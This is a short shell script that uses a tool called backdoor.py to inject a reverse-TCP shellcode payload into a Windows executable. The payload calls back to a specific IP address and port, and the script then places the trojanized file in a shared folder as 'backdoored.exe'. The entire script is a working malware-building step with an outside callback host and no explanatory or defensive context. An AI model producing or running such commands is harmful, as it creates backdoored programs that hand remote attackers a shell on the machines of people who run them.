#!/bin/sh

./backdoor.py -f shared-vol/backdoor.exe -s iat_reverse_tcp_inline -H 95.247.171.107 -P 43231
mv backdoored/backdoor.exe shared-vol/backdoored.exe
